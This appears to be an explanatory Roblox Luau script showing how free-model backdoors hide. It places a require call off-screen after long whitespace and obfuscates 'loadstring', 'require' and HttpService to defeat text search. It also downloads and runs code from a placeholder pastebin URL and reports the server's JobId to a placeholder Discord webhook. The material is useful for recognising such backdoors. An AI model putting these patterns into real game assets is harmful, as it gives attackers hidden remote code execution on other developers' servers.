-- Example of the tricks real free-model backdoors use.
-- Everything here is inert: the asset IDs and URLs are fake.

local Players = game:GetService("Players")

local function onPlayerAdded(player)
	player.CharacterAdded:Connect(function(character)
		character:WaitForChild("Humanoid").WalkSpeed = 16
	end)
end

Players.PlayerAdded:Connect(onPlayerAdded)                                                                                                                                                              require(123456789)

-- Asset ID hidden behind arithmetic and a variable
local cfg = 0x75BCD15 - 1
local ok = pcall(require, cfg)

-- "loadstring" and "require" written so a text search will not find them
local env = getfenv()
local run = env[string.char(108, 111, 97, 100, 115, 116, 114, 105, 110, 103)]
local req = env["\114\101\113\117\105\114\101"]
local http = game:GetService(("ecivreSpttH"):reverse())

-- Download-and-execute plus a webhook that reports infected servers
run(http:GetAsync("https://pastebin.com/raw/xXxFAKExXx"))()
http:PostAsync("https://discord.com/api/web" .. "hooks/000/FAKE", game.JobId)
